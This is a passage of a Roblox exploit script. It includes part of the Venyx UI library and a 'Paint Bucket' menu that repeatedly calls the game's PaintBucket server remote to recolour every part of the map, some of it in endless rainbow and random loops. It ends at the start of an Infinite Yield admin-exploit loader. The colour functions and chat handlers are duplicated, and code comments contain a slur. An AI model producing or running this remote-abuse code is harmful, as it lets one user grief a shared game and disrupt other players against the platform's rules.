					for i, prop in pairs({"r", "g", "b"}) do
						rgb[prop] = color3[prop:upper()] * 255
					end

					local x = hue -- hue is updated
					self:updateColorPicker(colorpicker, nil, {hue, sat, brightness}) -- roblox is literally retarded
					utility:Tween(tab.Container.Color.Select, {Position = UDim2.new(x, 0, 0, 0)}, 0.1) -- overwrite

					callback(color3)
					utility:Wait()
				end
			end)

			-- click events
			local button = colorpicker.Button
			local toggle, debounce, animate

			lastColor = Color3.fromHSV(hue, sat, brightness)
			animate = function(visible, overwrite)

				if overwrite then

					if not toggle then
						return
					end

					if debounce then
						while debounce do
							utility:Wait()
						end
					end
				elseif not overwrite then
					if debounce then 
						return 
					end

					if button.ImageTransparency == 0 then
						utility:Pop(button, 10)
					end
				end

				toggle = visible
				debounce = true

				if visible then

					if self.page.library.activePicker and self.page.library.activePicker ~= animate then
						self.page.library.activePicker(nil, true)
					end

					self.page.library.activePicker = animate
					lastColor = Color3.fromHSV(hue, sat, brightness)

					local x1, x2 = button.AbsoluteSize.X / 2, 162--tab.AbsoluteSize.X
					local px, py = button.AbsolutePosition.X, button.AbsolutePosition.Y

					tab.ClipsDescendants = true
					tab.Visible = true
					tab.Size = UDim2.new(0, 0, 0, 0)

					tab.Position = UDim2.new(0, x1 + x2 + px, 0, py)
					utility:Tween(tab, {Size = UDim2.new(0, 162, 0, 169)}, 0.2)

					-- update size and position
					wait(0.2)
					tab.ClipsDescendants = false

					canvasSize, canvasPosition = canvas.AbsoluteSize, canvas.AbsolutePosition
					colorSize, colorPosition = color.AbsoluteSize, color.AbsolutePosition
				else
					utility:Tween(tab, {Size = UDim2.new(0, 0, 0, 0)}, 0.2)
					tab.ClipsDescendants = true

					wait(0.2)
					tab.Visible = false
				end

				debounce = false
			end

			local toggleTab = function()
				animate(not toggle)
			end

			button.MouseButton1Click:Connect(toggleTab)
			colorpicker.MouseButton1Click:Connect(toggleTab)

			tab.Container.Button.MouseButton1Click:Connect(function()
				animate()
			end)

			tab.Close.MouseButton1Click:Connect(function()
				self:updateColorPicker(colorpicker, nil, lastColor)
				animate()
			end)

			return colorpicker
		end

		function section:addSlider(title, default, min, max, callback)
			local slider = utility:Create("ImageButton", {
				Name = "Slider",
				Parent = self.container,
				BackgroundTransparency = 1,
				BorderSizePixel = 0,
				Position = UDim2.new(0.292817682, 0, 0.299145311, 0),
				Size = UDim2.new(1, 0, 0, 50),
				ZIndex = 2,
				Image = "rbxassetid://5028857472",
				ImageColor3 = themes.DarkContrast,
				ScaleType = Enum.ScaleType.Slice,
				SliceCenter = Rect.new(2, 2, 298, 298)
			}, {
				utility:Create("TextLabel", {
					Name = "Title",
					BackgroundTransparency = 1,
					Position = UDim2.new(0, 10, 0, 6),
					Size = UDim2.new(0.5, 0, 0, 16),
					ZIndex = 3,
					Font = Enum.Font.Gotham,
					Text = title,
					TextColor3 = themes.TextColor,
					TextSize = 12,
					TextTransparency = 0.10000000149012,
					TextXAlignment = Enum.TextXAlignment.Left
				}),
				utility:Create("TextBox", {
					Name = "TextBox",
					BackgroundTransparency = 1,
					BorderSizePixel = 0,
					Position = UDim2.new(1, -30, 0, 6),
					Size = UDim2.new(0, 20, 0, 16),
					ZIndex = 3,
					Font = Enum.Font.GothamSemibold,
					Text = default or min,
					TextColor3 = themes.TextColor,
					TextSize = 12,
					TextXAlignment = Enum.TextXAlignment.Right
				}),
				utility:Create("TextLabel", {
					Name = "Slider",
					BackgroundTransparency = 1,
					Position = UDim2.new(0, 10, 0, 28),
					Size = UDim2.new(1, -20, 0, 16),
					ZIndex = 3,
					Text = "",
				}, {
					utility:Create("ImageLabel", {
						Name = "Bar",
						AnchorPoint = Vector2.new(0, 0.5),
						BackgroundTransparency = 1,
						Position = UDim2.new(0, 0, 0.5, 0),
						Size = UDim2.new(1, 0, 0, 4),
						ZIndex = 3,
						Image = "rbxassetid://5028857472",
						ImageColor3 = themes.LightContrast,
						ScaleType = Enum.ScaleType.Slice,
						SliceCenter = Rect.new(2, 2, 298, 298)
					}, {
						utility:Create("ImageLabel", {
							Name = "Fill",
							BackgroundTransparency = 1,
							Size = UDim2.new(0.8, 0, 1, 0),
							ZIndex = 3,
							Image = "rbxassetid://5028857472",
							ImageColor3 = themes.TextColor,
							ScaleType = Enum.ScaleType.Slice,
							SliceCenter = Rect.new(2, 2, 298, 298)
						}, {
							utility:Create("ImageLabel", {
								Name = "Circle",
								AnchorPoint = Vector2.new(0.5, 0.5),
								BackgroundTransparency = 1,
								ImageTransparency = 1.000,
								ImageColor3 = themes.TextColor,
								Position = UDim2.new(1, 0, 0.5, 0),
								Size = UDim2.new(0, 10, 0, 10),
								ZIndex = 3,
								Image = "rbxassetid://4608020054"
							})
						})
					})
				})
			})

			table.insert(self.modules, slider)
			--self:Resize()

			local allowed = {
				[""] = true,
				["-"] = true
			}

			local textbox = slider.TextBox
			local circle = slider.Slider.Bar.Fill.Circle

			local value = default or min
			local dragging, last

			local callback = function(value)
				if callback then
					callback(value, function(...)
						self:updateSlider(slider, ...)
					end)
				end
			end

			self:updateSlider(slider, nil, value, min, max)

			utility:DraggingEnded(function()
				dragging = false
			end)

			slider.MouseButton1Down:Connect(function(input)
				dragging = true

				while dragging do
					utility:Tween(circle, {ImageTransparency = 0}, 0.1)

					value = self:updateSlider(slider, nil, nil, min, max, value)
					callback(value)

					utility:Wait()
				end

				wait(0.5)
				utility:Tween(circle, {ImageTransparency = 1}, 0.2)
			end)

			textbox.FocusLost:Connect(function()
				if not tonumber(textbox.Text) then
					value = self:updateSlider(slider, nil, default or min, min, max)
					callback(value)
				end
			end)

			textbox:GetPropertyChangedSignal("Text"):Connect(function()
				local text = textbox.Text

				if not allowed[text] and not tonumber(text) then
					textbox.Text = text:sub(1, #text - 1)
				elseif not allowed[text] then	
					value = self:updateSlider(slider, nil, tonumber(text) or value, min, max)
					callback(value)
				end
			end)

			return slider
		end

		function section:addDropdown(title, list, callback)
			local dropdown = utility:Create("Frame", {
				Name = "Dropdown",
				Parent = self.container,
				BackgroundTransparency = 1,
				Size = UDim2.new(1, 0, 0, 30),
				ClipsDescendants = true
			}, {
				utility:Create("UIListLayout", {
					SortOrder = Enum.SortOrder.LayoutOrder,
					Padding = UDim.new(0, 4)
				}),
				utility:Create("ImageLabel", {
					Name = "Search",
					BackgroundTransparency = 1,
					BorderSizePixel = 0,
					Size = UDim2.new(1, 0, 0, 30),
					ZIndex = 2,
					Image = "rbxassetid://5028857472",
					ImageColor3 = themes.DarkContrast,
					ScaleType = Enum.ScaleType.Slice,
					SliceCenter = Rect.new(2, 2, 298, 298)
				}, {
					utility:Create("TextBox", {
						Name = "TextBox",
						AnchorPoint = Vector2.new(0, 0.5),
						BackgroundTransparency = 1,
						TextTruncate = Enum.TextTruncate.AtEnd,
						Position = UDim2.new(0, 10, 0.5, 1),
						Size = UDim2.new(1, -42, 1, 0),
						ZIndex = 3,
						Font = Enum.Font.Gotham,
						Text = title,
						TextColor3 = themes.TextColor,
						TextSize = 12,
						TextTransparency = 0.10000000149012,
						TextXAlignment = Enum.TextXAlignment.Left
					}),
					utility:Create("ImageButton", {
						Name = "Button",
						BackgroundTransparency = 1,
						BorderSizePixel = 0,
						Position = UDim2.new(1, -28, 0.5, -9),
						Size = UDim2.new(0, 18, 0, 18),
						ZIndex = 3,
						Image = "rbxassetid://5012539403",
						ImageColor3 = themes.TextColor,
						SliceCenter = Rect.new(2, 2, 298, 298)
					})
				}),
				utility:Create("ImageLabel", {
					Name = "List",
					BackgroundTransparency = 1,
					BorderSizePixel = 0,
					Size = UDim2.new(1, 0, 1, -34),
					ZIndex = 2,
					Image = "rbxassetid://5028857472",
					ImageColor3 = themes.Background,
					ScaleType = Enum.ScaleType.Slice,
					SliceCenter = Rect.new(2, 2, 298, 298)
				}, {
					utility:Create("ScrollingFrame", {
						Name = "Frame",
						Active = true,
						BackgroundTransparency = 1,
						BorderSizePixel = 0,
						Position = UDim2.new(0, 4, 0, 4),
						Size = UDim2.new(1, -8, 1, -8),
						CanvasPosition = Vector2.new(0, 28),
						CanvasSize = UDim2.new(0, 0, 0, 120),
						ZIndex = 2,
						ScrollBarThickness = 3,
						ScrollBarImageColor3 = themes.DarkContrast
					}, {
						utility:Create("UIListLayout", {
							SortOrder = Enum.SortOrder.LayoutOrder,
							Padding = UDim.new(0, 4)
						})
					})
				})
			})

			table.insert(self.modules, dropdown)
			--self:Resize()

			local search = dropdown.Search
			local focused

			list = list or {}

			search.Button.MouseButton1Click:Connect(function()
				if search.Button.Rotation == 0 then
					self:updateDropdown(dropdown, nil, list, callback)
				else
					self:updateDropdown(dropdown, nil, nil, callback)
				end
			end)

			search.TextBox.Focused:Connect(function()
				if search.Button.Rotation == 0 then
					self:updateDropdown(dropdown, nil, list, callback)
				end

				focused = true
			end)

			search.TextBox.FocusLost:Connect(function()
				focused = false
			end)

			search.TextBox:GetPropertyChangedSignal("Text"):Connect(function()
				if focused then
					local list = utility:Sort(search.TextBox.Text, list)
					list = #list ~= 0 and list 

					self:updateDropdown(dropdown, nil, list, callback)
				end
			end)

			dropdown:GetPropertyChangedSignal("Size"):Connect(function()
				self:Resize()
			end)

			return dropdown
		end

		-- class functions

		function library:SelectPage(page, toggle)

			if toggle and self.focusedPage == page then -- already selected
				return
			end

			local button = page.button

			if toggle then
				-- page button
				button.Title.TextTransparency = 0
				button.Title.Font = Enum.Font.GothamSemibold

				if button:FindFirstChild("Icon") then
					button.Icon.ImageTransparency = 0
				end

				-- update selected page
				local focusedPage = self.focusedPage
				self.focusedPage = page

				if focusedPage then
					self:SelectPage(focusedPage)
				end

				-- sections
				local existingSections = focusedPage and #focusedPage.sections or 0
				local sectionsRequired = #page.sections - existingSections

				page:Resize()

				for i, section in pairs(page.sections) do
					section.container.Parent.ImageTransparency = 0
				end

				if sectionsRequired < 0 then -- "hides" some sections
					for i = existingSections, #page.sections + 1, -1 do
						local section = focusedPage.sections[i].container.Parent

						utility:Tween(section, {ImageTransparency = 1}, 0.1)
					end
				end

				wait(0.1)
				page.container.Visible = true

				if focusedPage then
					focusedPage.container.Visible = false
				end

				if sectionsRequired > 0 then -- "creates" more section
					for i = existingSections + 1, #page.sections do
						local section = page.sections[i].container.Parent

						section.ImageTransparency = 1
						utility:Tween(section, {ImageTransparency = 0}, 0.05)
					end
				end

				wait(0.05)

				for i, section in pairs(page.sections) do

					utility:Tween(section.container.Title, {TextTransparency = 0}, 0.1)
					section:Resize(true)

					wait(0.05)
				end

				wait(0.05)
				page:Resize(true)
			else
				-- page button
				button.Title.Font = Enum.Font.Gotham
				button.Title.TextTransparency = 0.65

				if button:FindFirstChild("Icon") then
					button.Icon.ImageTransparency = 0.65
				end

				-- sections
				for i, section in pairs(page.sections) do	
					utility:Tween(section.container.Parent, {Size = UDim2.new(1, -10, 0, 28)}, 0.1)
					utility:Tween(section.container.Title, {TextTransparency = 1}, 0.1)
				end

				wait(0.1)

				page.lastPosition = page.container.CanvasPosition.Y
				page:Resize()
			end
		end

		function page:Resize(scroll)
			local padding = 10
			local size = 0

			for i, section in pairs(self.sections) do
				size = size + section.container.Parent.AbsoluteSize.Y + padding
			end

			self.container.CanvasSize = UDim2.new(0, 0, 0, size)
			self.container.ScrollBarImageTransparency = size > self.container.AbsoluteSize.Y

			if scroll then
				utility:Tween(self.container, {CanvasPosition = Vector2.new(0, self.lastPosition or 0)}, 0.2)
			end
		end

		function section:Resize(smooth)

			if self.page.library.focusedPage ~= self.page then
				return
			end

			local padding = 4
			local size = (4 * padding) + self.container.Title.AbsoluteSize.Y -- offset

			for i, module in pairs(self.modules) do
				size = size + module.AbsoluteSize.Y + padding
			end

			if smooth then
				utility:Tween(self.container.Parent, {Size = UDim2.new(1, -10, 0, size)}, 0.05)
			else
				self.container.Parent.Size = UDim2.new(1, -10, 0, size)
				self.page:Resize()
			end
		end

		function section:getModule(info)

			if table.find(self.modules, info) then
				return info
			end

			for i, module in pairs(self.modules) do
				if (module:FindFirstChild("Title") or module:FindFirstChild("TextBox", true)).Text == info then
					return module
				end
			end

			error("No module found under "..tostring(info))
		end

		-- updates

		function section:updateButton(button, title)
			button = self:getModule(button)

			button.Title.Text = title
		end

		function section:updateToggle(toggle, title, value)
			toggle = self:getModule(toggle)

			local position = {
				In = UDim2.new(0, 2, 0.5, -6),
				Out = UDim2.new(0, 20, 0.5, -6)
			}

			local frame = toggle.Button.Frame
			value = value and "Out" or "In"

			if title then
				toggle.Title.Text = title
			end

			utility:Tween(frame, {
				Size = UDim2.new(1, -22, 1, -9),
				Position = position[value] + UDim2.new(0, 0, 0, 2.5)
			}, 0.2)

			wait(0.1)
			utility:Tween(frame, {
				Size = UDim2.new(1, -22, 1, -4),
				Position = position[value]
			}, 0.1)
		end

		function section:updateTextbox(textbox, title, value)
			textbox = self:getModule(textbox)

			if title then
				textbox.Title.Text = title
			end

			if value then
				textbox.Button.Textbox.Text = value
			end

		end

		function section:updateKeybind(keybind, title, key)
			keybind = self:getModule(keybind)

			local text = keybind.Button.Text
			local bind = self.binds[keybind]

			if title then
				keybind.Title.Text = title
			end

			if bind.connection then
				bind.connection = bind.connection:UnBind()
			end

			if key then
				self.binds[keybind].connection = utility:BindToKey(key, bind.callback)
				text.Text = key.Name
			else
				text.Text = "None"
			end
		end

		function section:updateColorPicker(colorpicker, title, color)
			colorpicker = self:getModule(colorpicker)

			local picker = self.colorpickers[colorpicker]
			local tab = picker.tab
			local callback = picker.callback

			if title then
				colorpicker.Title.Text = title
				tab.Title.Text = title
			end

			local color3
			local hue, sat, brightness

			if type(color) == "table" then -- roblox is literally retarded x2
				hue, sat, brightness = unpack(color)
				color3 = Color3.fromHSV(hue, sat, brightness)
			else
				color3 = color
				hue, sat, brightness = Color3.toHSV(color3)
			end

			utility:Tween(colorpicker.Button, {ImageColor3 = color3}, 0.5)
			utility:Tween(tab.Container.Color.Select, {Position = UDim2.new(hue, 0, 0, 0)}, 0.1)

			utility:Tween(tab.Container.Canvas, {ImageColor3 = Color3.fromHSV(hue, 1, 1)}, 0.5)
			utility:Tween(tab.Container.Canvas.Cursor, {Position = UDim2.new(sat, 0, 1 - brightness)}, 0.5)

			for i, container in pairs(tab.Container.Inputs:GetChildren()) do
				if container:IsA("ImageLabel") then
					local value = math.clamp(color3[container.Name], 0, 1) * 255

					container.Textbox.Text = math.floor(value)
					--callback(container.Name:lower(), value)
				end
			end
		end

		function section:updateSlider(slider, title, value, min, max, lvalue)
			slider = self:getModule(slider)

			if title then
				slider.Title.Text = title
			end

			local bar = slider.Slider.Bar
			local percent = (mouse.X - bar.AbsolutePosition.X) / bar.AbsoluteSize.X

			if value then -- support negative ranges
				percent = (value - min) / (max - min)
			end

			percent = math.clamp(percent, 0, 1)
			value = value or math.floor(min + (max - min) * percent)

			slider.TextBox.Text = value
			utility:Tween(bar.Fill, {Size = UDim2.new(percent, 0, 1, 0)}, 0.1)

			if value ~= lvalue and slider.ImageTransparency == 0 then
				utility:Pop(slider, 10)
			end

			return value
		end

		function section:updateDropdown(dropdown, title, list, callback)
			dropdown = self:getModule(dropdown)

			if title then
				dropdown.Search.TextBox.Text = title
			end

			local entries = 0

			utility:Pop(dropdown.Search, 10)

			for i, button in pairs(dropdown.List.Frame:GetChildren()) do
				if button:IsA("ImageButton") then
					button:Destroy()
				end
			end

			for i, value in pairs(list or {}) do
				local button = utility:Create("ImageButton", {
					Parent = dropdown.List.Frame,
					BackgroundTransparency = 1,
					BorderSizePixel = 0,
					Size = UDim2.new(1, 0, 0, 30),
					ZIndex = 2,
					Image = "rbxassetid://5028857472",
					ImageColor3 = themes.DarkContrast,
					ScaleType = Enum.ScaleType.Slice,
					SliceCenter = Rect.new(2, 2, 298, 298)
				}, {
					utility:Create("TextLabel", {
						BackgroundTransparency = 1,
						Position = UDim2.new(0, 10, 0, 0),
						Size = UDim2.new(1, -10, 1, 0),
						ZIndex = 3,
						Font = Enum.Font.Gotham,
						Text = value,
						TextColor3 = themes.TextColor,
						TextSize = 12,
						TextXAlignment = "Left",
						TextTransparency = 0.10000000149012
					})
				})

				button.MouseButton1Click:Connect(function()
					if callback then
						callback(value, function(...)
							self:updateDropdown(dropdown, ...)
						end)	
					end

					self:updateDropdown(dropdown, value, nil, callback)
				end)

				entries = entries + 1
			end

			local frame = dropdown.List.Frame

			utility:Tween(dropdown, {Size = UDim2.new(1, 0, 0, (entries == 0 and 30) or math.clamp(entries, 0, 3) * 34 + 38)}, 0.3)
			utility:Tween(dropdown.Search.Button, {Rotation = list and 180 or 0}, 0.3)

			if entries > 3 then

				for i, button in pairs(dropdown.List.Frame:GetChildren()) do
					if button:IsA("ImageButton") then
						button.Size = UDim2.new(1, -6, 0, 30)
					end
				end

				frame.CanvasSize = UDim2.new(0, 0, 0, (entries * 34) - 4)
				frame.ScrollBarImageTransparency = 0
			else
				frame.CanvasSize = UDim2.new(0, 0, 0, 0)
				frame.ScrollBarImageTransparency = 1
			end
		end
	end

	local library = library
	local venyx = library.new(guiname, 5013109572)


	-- themes
	local themes = {
		Background = Color3.fromRGB(24, 24, 24),
		Glow = Color3.fromRGB(0, 0, 0),
		Accent = Color3.fromRGB(10, 10, 10),
		LightContrast = Color3.fromRGB(20, 20, 20),
		DarkContrast = Color3.fromRGB(14, 14, 14),
		TextColor = Color3.fromRGB(255, 255, 255)
	}

	-- first page
	local page = venyx:addPage("Main", 5012544693)
	local section1 = page:addSection("Paint Bucket")

	local colours = {"Black", "White", "Brown", "Pink","Purple", "Blue", "Green", "Orange", "Yellow", "Red", "Random"}

	for i = 1, #colours do 
		section1:addButton(
			"Colour Map "..colours[i],
			function()
				game.Players:Chat(prefix..colours[i]:lower())
			end
		)
	end


	section1:addButton(
		"Rainbow Map",
		function()
			game.Players:Chat(prefix.."rainbow")
		end
	)

	section1:addButton(
		"Loop Randomize",
		function()
			game.Players:Chat(prefix.."randomize")
		end
	)

	section1:addButton(
		"Restore Map",
		function()
			game.Players:Chat(prefix.."default")
		end
	)

	game.Players.LocalPlayer.Chatted:Connect(function(msg)
		if msg == prefix..'rainbow' then
			for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
				if v.Name == "PaintBucket" then
					v.GripPos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position - Vector3.new(0, 5, 0)
				end
			end
			_G.crail = true
			wait(.6)
			local speed = 32

			for i = 0,1,0.0002*speed do task.wait()
				local clr = Color3.fromHSV(i,1,1)
				--local padss = ws.Terrain["_Game"]:GetDescendants()
				for i, v in pairs(game.Workspace:GetDescendants()) do
					if v:IsA("Part") then
						coroutine.wrap(function()
							local v1 =
								{
									["Part"] = v,
									["Color"] = clr
								}
							game:GetService("Players").LocalPlayer.Character.PaintBucket:WaitForChild("Remotes").ServerControls:InvokeServer("PaintPart", v1)
						end)()
					end
				end
				wait(1 / 12) -- recolor the map x times a second lol.
			end
			task.wait(1)

		end
		--end
	end)

	local function colour(part, c1, c2, c3)

		local args = {
			[1] = "PaintPart",
			[2] = {
				["Part"] = part,
				["Color"] = Color3.new(c1, c2, c3)
			}
		}
		spawn(
			function()
				game.Players.LocalPlayer.Character:WaitForChild("PaintBucket"):WaitForChild("Remotes").ServerControls:InvokeServer(
					unpack(args)
				)
			end
		)
	end


	local function black()
		for i, v in pairs(game.Workspace:GetDescendants()) do
			if v:IsA("Part") then
				colour(v, 0.0666667, 0.0666667, 0.0666667)
			end
		end
	end

	local function white()
		for i, v in pairs(game.Workspace:GetDescendants()) do
			if v:IsA("Part") then
				colour(v, 0.972549, 0.972549, 0.972549)
			end
		end
	end

	local function red()
		for i, v in pairs(game.Workspace:GetDescendants()) do
			if v:IsA("Part") then
				colour(v, 1, 0, 0)
			end
		end
	end

	local function blue()
		for i, v in pairs(game.Workspace:GetDescendants()) do
			if v:IsA("Part") then
				colour(v, 0.0352941, 0.537255, 0.811765)
			end
		end
	end

	local function green()
		for i, v in pairs(game.Workspace:GetDescendants()) do
			if v:IsA("Part") then
				colour(v, 0.121569, 0.501961, 0.113725)
			end
		end
	end

	local function orange()
		for i, v in pairs(game.Workspace:GetDescendants()) do
			if v:IsA("Part") then
				colour(v, 0.666667, 0.333333, 0)
			end
		end
	end

	local function yellow()
		for i, v in pairs(game.Workspace:GetDescendants()) do
			if v:IsA("Part") then
				colour(v, 1, 1, 0)
			end
		end
	end

	local function brown()
		for i, v in pairs(game.Workspace:GetDescendants()) do
			if v:IsA("Part") then
				colour(v, 0.486275, 0.360784, 0.27451)
			end
		end
	end


	local function purple()
		for i, v in pairs(game.Workspace:GetDescendants()) do
			if v:IsA("Part") then
				colour(v, 0.482353, 0, 0.482353)
			end
		end
	end

	local function pink()
		for i, v in pairs(game.Workspace:GetDescendants()) do
			if v:IsA("Part") then
				colour(v, 1, 0.4, 0.8)
			end
		end
	end

	local function default()
		local defaultmap = readfile("FencingMap.txt")
		defaultmap = defaultmap:split("#/")

		for i, v in pairs(game.Workspace:GetDescendants()) do
			if v:IsA("Part") then
				if table.find(defaultmap, v.Name) then
					local index 
					for i = 1, #defaultmap do 
						if v.Name == defaultmap[i] then 
							index = i + 1 
						end 
					end
					index = defaultmap[index]:split(", ")
					colour(v, tonumber(index[1]), tonumber(index[2]), tonumber(index[3]))
				end
			end
		end
	end

	game.Players.LocalPlayer.Chatted:Connect(function(msg)
		if msg == prefix.."black" then 
			black()
		end
		if msg == prefix.."red" then 
			red()
		end
		if msg == prefix.."blue" then 
			blue()
		end
		if msg == prefix.."green" then 
			green()
		end
		if msg == prefix.."pink" then 
			pink()
		end
		if msg == prefix.."brown" then 
			brown()
		end
		if msg == prefix.."yellow" then 
			yellow()
		end
		if msg == prefix.."orange" then 
			orange()
		end
		if msg == prefix.."white" then 
			white()
		end
		if msg == prefix.."purple" then 
			purple()
		end
		if msg == prefix.."default" then 
			default()
		end
	end)

	game.Players.LocalPlayer.Chatted:Connect(function(msg)
		if msg == prefix.."random" then 
			coroutine.wrap(
				function()

					for i, v in pairs(game.Workspace:GetDescendants()) do
						if v:IsA("Part") then
							colour(v, math.random(), math.random(), math.random())
						end
					end
				end
			)()
		end
	end
	)

	game.Players.LocalPlayer.Chatted:Connect(function(msg)
		if msg == prefix.."randomize" then 
			coroutine.wrap(
				function()
					while game.Players.LocalPlayer.Character:FindFirstChild("PaintBucket") do
						wait()
						for i, v in pairs(game.Workspace:GetDescendants()) do
							if v:IsA("Part") then
								colour(v, math.random(), math.random(), math.random())
							end
						end
					end
				end
			)()
		end
	end
	)

	local function colour(part, c1, c2, c3)

		local args = {
			[1] = "PaintPart",
			[2] = {
				["Part"] = part,
				["Color"] = Color3.new(c1, c2, c3)
			}
		}
		spawn(
			function()
				game.Players.LocalPlayer.Character:WaitForChild("PaintBucket"):WaitForChild("Remotes").ServerControls:InvokeServer(
					unpack(args)
				)
			end
		)
	end


	local function black()
		for i, v in pairs(game.Workspace:GetDescendants()) do
			if v:IsA("Part") then
				colour(v, 0.0666667, 0.0666667, 0.0666667)
			end
		end
	end

	local function white()
		for i, v in pairs(game.Workspace:GetDescendants()) do
			if v:IsA("Part") then
				colour(v, 0.972549, 0.972549, 0.972549)
			end
		end
	end

	local function red()
		for i, v in pairs(game.Workspace:GetDescendants()) do
			if v:IsA("Part") then
				colour(v, 1, 0, 0)
			end
		end
	end

	local function blue()
		for i, v in pairs(game.Workspace:GetDescendants()) do
			if v:IsA("Part") then
				colour(v, 0.0352941, 0.537255, 0.811765)
			end
		end
	end

	local function green()
		for i, v in pairs(game.Workspace:GetDescendants()) do
			if v:IsA("Part") then
				colour(v, 0.121569, 0.501961, 0.113725)
			end
		end
	end

	local function orange()
		for i, v in pairs(game.Workspace:GetDescendants()) do
			if v:IsA("Part") then
				colour(v, 0.666667, 0.333333, 0)
			end
		end
	end

	local function yellow()
		for i, v in pairs(game.Workspace:GetDescendants()) do
			if v:IsA("Part") then
				colour(v, 1, 1, 0)
			end
		end
	end

	local function brown()
		for i, v in pairs(game.Workspace:GetDescendants()) do
			if v:IsA("Part") then
				colour(v, 0.486275, 0.360784, 0.27451)
			end
		end
	end


	local function purple()
		for i, v in pairs(game.Workspace:GetDescendants()) do
			if v:IsA("Part") then
				colour(v, 0.482353, 0, 0.482353)
			end
		end
	end

	local function pink()
		for i, v in pairs(game.Workspace:GetDescendants()) do
			if v:IsA("Part") then
				colour(v, 1, 0.4, 0.8)
			end
		end
	end

	local function default()
		local defaultmap = readfile("FencingMap.txt")
		defaultmap = defaultmap:split("#/")

		for i, v in pairs(game.Workspace:GetDescendants()) do
			if v:IsA("Part") then
				if table.find(defaultmap, v.Name) then
					local index 
					for i = 1, #defaultmap do 
						if v.Name == defaultmap[i] then 
							index = i + 1 
						end 
					end
					index = defaultmap[index]:split(", ")
					colour(v, tonumber(index[1]), tonumber(index[2]), tonumber(index[3]))
				end
			end
		end
	end

	game.Players.LocalPlayer.Chatted:Connect(function(msg)
		if msg == prefix.."black" then 
			black()
		end
		if msg == prefix.."red" then 
			red()
		end
		if msg == prefix.."blue" then 
			blue()
		end
		if msg == prefix.."green" then 
			green()
		end
		if msg == prefix.."pink" then 
			pink()
		end
		if msg == prefix.."brown" then 
			brown()
		end
		if msg == prefix.."yellow" then 
			yellow()
		end
		if msg == prefix.."orange" then 
			orange()
		end
		if msg == prefix.."white" then 
			white()
		end
		if msg == prefix.."purple" then 
			purple()
		end
		if msg == prefix.."default" then 
			default()
		end
	end)

	game.Players.LocalPlayer.Chatted:Connect(function(msg)
		if msg == prefix.."random" then 
			coroutine.wrap(
				function()

					for i, v in pairs(game.Workspace:GetDescendants()) do
						if v:IsA("Part") then
							colour(v, math.random(), math.random(), math.random())
						end
					end
				end
			)()
		end
	end
	)

	game.Players.LocalPlayer.Chatted:Connect(function(msg)
		if msg == prefix.."randomize" then 
			coroutine.wrap(
				function()
					while game.Players.LocalPlayer.Character:FindFirstChild("PaintBucket") do
						wait()
						for i, v in pairs(game.Workspace:GetDescendants()) do
							if v:IsA("Part") then
								colour(v, math.random(), math.random(), math.random())
							end
						end
					end
				end
			)()
		end
	end
	)


end

function mod:LoadIY()

	COREGUI = game.Players.LocalPlayer.PlayerGui
	if not game:IsLoaded() then
		local notLoaded = Instance.new("Message")
		notLoaded.Parent = COREGUI
		notLoaded.Text = 'Infinite Yield is waiting for the game to load'
		game.Loaded:Wait()
		notLoaded:Destroy()
	end

	currentVersion = '5.9.3'

	Players = game:GetService("Players")

	Holder = Instance.new("Frame")
	Title = Instance.new("TextLabel")
	Dark = Instance.new("Frame")
	Cmdbar = Instance.new("TextBox")
	CMDsF = Instance.new("ScrollingFrame")
	cmdListLayout = Instance.new("UIListLayout")
	SettingsButton = Instance.new("ImageButton")
	ColorsButton = Instance.new("ImageButton")
	Settings = Instance.new("Frame")
	Prefix = Instance.new("TextLabel")
	PrefixBox = Instance.new("TextBox")
	Keybinds = Instance.new("TextLabel")
	StayOpen = Instance.new("TextLabel")
	Button = Instance.new("Frame")
	On = Instance.new("TextButton")
	Positions = Instance.new("TextLabel")
	EventBind = Instance.new("TextLabel")
	Plugins = Instance.new("TextLabel")
	Example = Instance.new("TextButton")
	Notification = Instance.new("Frame")
	Title_2 = Instance.new("TextLabel")
	Text_2 = Instance.new("TextLabel")
	CloseButton = Instance.new("TextButton")
	CloseImage = Instance.new("ImageLabel")
	PinButton = Instance.new("TextButton")
	PinImage = Instance.new("ImageLabel")
	Tooltip = Instance.new("Frame")
	Title_3 = Instance.new("TextLabel")
	Description = Instance.new("TextLabel")
	IntroBackground = Instance.new("Frame")
	Logo = Instance.new("ImageLabel")
	Credits = Instance.new("TextBox")
	KeybindsFrame = Instance.new("Frame")
	Close = Instance.new("TextButton")
	Add = Instance.new("TextButton")
	Delete = Instance.new("TextButton")
	Holder_2 = Instance.new("ScrollingFrame")
	Example_2 = Instance.new("Frame")
	Text_3 = Instance.new("TextLabel")
	Delete_2 = Instance.new("TextButton")
	KeybindEditor = Instance.new("Frame")
	background_2 = Instance.new("Frame")
	Dark_3 = Instance.new("Frame")
	Directions = Instance.new("TextLabel")
	BindTo = Instance.new("TextButton")
	TriggerLabel = Instance.new("TextLabel")
	BindTriggerSelect = Instance.new("TextButton")
	Add_2 = Instance.new("TextButton")
	Toggles = Instance.new("ScrollingFrame")
	ClickTP  = Instance.new("TextLabel")
	Select = Instance.new("TextButton")
	ClickDelete = Instance.new("TextLabel")
	Select_2 = Instance.new("TextButton")
	Cmdbar_2 = Instance.new("TextBox")
	Cmdbar_3 = Instance.new("TextBox")
	CreateToggle = Instance.new("TextLabel")
	Button_2 = Instance.new("Frame")
	On_2 = Instance.new("TextButton")
	shadow_2 = Instance.new("Frame")
	PopupText_2 = Instance.new("TextLabel")
	Exit_2 = Instance.new("TextButton")
	ExitImage_2 = Instance.new("ImageLabel")
	PositionsFrame = Instance.new("Frame")
	Close_3 = Instance.new("TextButton")
	Delete_5 = Instance.new("TextButton")
	Part = Instance.new("TextButton")
	Holder_4 = Instance.new("ScrollingFrame")
	Example_4 = Instance.new("Frame")
	Text_5 = Instance.new("TextLabel")
	Delete_6 = Instance.new("TextButton")
	TP = Instance.new("TextButton")
	AliasesFrame = Instance.new("Frame")
	Close_2 = Instance.new("TextButton")
	Delete_3 = Instance.new("TextButton")
	Holder_3 = Instance.new("ScrollingFrame")
	Example_3 = Instance.new("Frame")
	Text_4 = Instance.new("TextLabel")
	Delete_4 = Instance.new("TextButton")
	Aliases = Instance.new("TextLabel")
	PluginsFrame = Instance.new("Frame")
	Close_4 = Instance.new("TextButton")
	Add_3 = Instance.new("TextButton")
	Holder_5 = Instance.new("ScrollingFrame")
	Example_5 = Instance.new("Frame")
	Text_6 = Instance.new("TextLabel")
	Delete_7 = Instance.new("TextButton")
	PluginEditor = Instance.new("Frame")
	background_3 = Instance.new("Frame")
